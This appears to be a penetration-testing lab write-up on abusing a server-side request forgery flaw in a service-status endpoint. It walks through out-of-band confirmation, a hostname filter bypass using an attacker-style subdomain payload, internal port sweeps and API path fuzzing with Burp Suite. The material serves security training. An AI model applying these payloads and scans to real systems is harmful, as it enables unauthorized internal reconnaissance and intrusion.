# SSRF Mapping & Internal Enumeration via Service‑Status Endpoint

## High‑Level Summary

This note documents a full methodology for leveraging a **second SSRF flaw** discovered in the _service‑status_ feature of the lab application. Steps include validation of the bug, bypassing hostname filters, enumerating internal ports, fuzzing hidden API paths, and building a clear picture of the microservice attack surface. The workflow relies on **Burp Suite**, **Burp Collaborator**, and a curated **Assetnote wordlist**.

---

## 1  Initial Recon: Service‑Status Behaviour

> [!info]  
> Navigating to **`/services`** in the customer portal (`localhost:3001`) displays four _Status Up_ responses. Browser traffic shows background calls to **`/pdf/status/check?url=<partial‑url>`**.

- Suspicious parameter `url` suggests server‑side fetch → potential SSRF.
    
- Each displayed _Up_ result hints at distinct backend micro‑services.
    

---

## 2  Validating SSRF with Burp Collaborator

1. **Clear proxy history** → hard‑refresh `/services`.
    
2. Send request to **Repeater** and swap the `url` value for a Burp Collaborator payload.
    
3. Test with and without `http://` prefix.
    

Results

- Response: `status down – domain not allowed (localhost & 127.0.0.1 only)`
    
- **Collaborator logs still record DNS/HTTP callbacks** → request executed _before_ filter check.
    

> [!warning]  
> Error messages can be **misleading**; always verify with OOB interaction rather than UI text.

---

## 3  Hostname Filter Bypass

- Error states only `localhost` / `127.0.0.1` are permitted.
    
- Simple sub‑domain trick succeeds:
    
    ```
    http://localhost.this.attacker.com
    ```
    
- Server accepts hostname (starts with `localhost`) and forwards request; filter runs post‑fetch.
    

> [!tip]  
> Keep a list of **filter‑evasion patterns** (sub‑domains, dot‑notation IPs, encoded IPs, `::1`, etc.). Even “CTF‑style” tricks can succeed on real targets.

---

## 4  Enumerating Internal Ports via Intruder

1. Change URL to `http://localhost:<§PORT§>`.
    
2. **Intruder** → Numbers payload 1‑5000.
    
3. Grep response for keyword **`up`**.
    

Findings

|Port|Result|
|---|---|
|3000|Up – core micro‑services|
|3001|Up – customer frontend|
|3002|Up – admin frontend|
|631|Up – unexpected (CUPS?)|

> [!info]  
> Response differences (`connection refused` vs. `status up`) provide a built‑in timing/response oracle to detect live services.

---

## 5  Fuzzing Internal API Paths

### Wordlist Preparation

- Use **Assetnote HTTP‑Archive API Routes** (2024‑05‑28 release).
    
- Remove leading slash so Intruder sends `url=/api/orders` not `//api/orders`.
    
- Disable URL‑encoding for payloads.
    

### Fuzz Procedure

```
Target URL : http://localhost:3000/§PATH§
Parameter  : url=VALUE (service‑status request)
```

Filter on keyword **`up`**.

Discovered endpoints

- `/api/orders`
    
- `/api/stocks`
    
- `/api/invoices`
    
- Additional UI‑referenced paths: `/invoices`, `/orders`, `/stocks`, `/pdf`
    

> [!tip]  
> Augment generic lists with **observed UI keywords**; the front‑end often hints at hidden routes.

---

## 6  Building the API Map

With confirmed base path **`/api/`**, pivot in Repeater:

```
/api/orders          → 200 OK
/api/orders/1        → object details
/api/orders/1/delete → 404 (method likely DELETE)
```

Iterate through

- Resource IDs (`/1`, `/2`, …)
    
- Common verbs (`create`, `update`, `delete`, `status`)
    
- Version prefixes (`/v1/`, `/v2/`)
    

> [!note]  
> Legacy or orphaned endpoints (old versions, dev features) often remain reachable even after UI removal.

---

## 7  Front‑End / Back‑End Mismatch

> [!warning]  
> UI validation **≠** server validation.
> 
> Controls applied client‑side may not exist server‑side; always test direct API calls.

Common gaps

- Missing authentication on internal APIs
    
- Unrestricted HTTP methods
    
- Inconsistent input validation
    

---

## 8  Tools

|Tool|Purpose|Key Actions|
|---|---|---|
|**Burp Suite**|Interception & automation|Proxy, Repeater, Intruder, Collaborator|
|**Burp Collaborator**|OOB interaction verifier|Capture DNS/HTTP callbacks|
|**Assetnote API Route Wordlists**|Real‑world endpoint guesses|`wordlists.assetnote.io` – API lists|
|**Browser (Burp embedded)**|Generate baseline traffic|Observe hidden URLs like `/pdf/status`|

---

## 9  Step‑by‑Step Checklist

-  Observe service‑status traffic (`/pdf/status/check`).
    
-  Verify SSRF via Collaborator.
    
-  Bypass hostname filter (sub‑domain technique).
    
-  Enumerate internal ports with Intruder.
    
-  Fuzz discovered ports for REST paths using Assetnote list.
    
-  Combine UI‑hinted words with wordlist results.
    
-  Map full API hierarchy; note legacy routes.
    
-  Test CRUD verbs and auth gaps directly.
    

---

## Key Takeaways

> [!important]  
> _SSRF is a dual‑use tool_: exploit **and** reconnaissance. Systematically combine OOB confirmation, simple filter bypasses, port sweeps, and intelligent wordlists to reveal complete internal attack surfaces.

Next up: evaluating impact—querying metadata services, extracting sensitive data, and escalating beyond reconnaissance.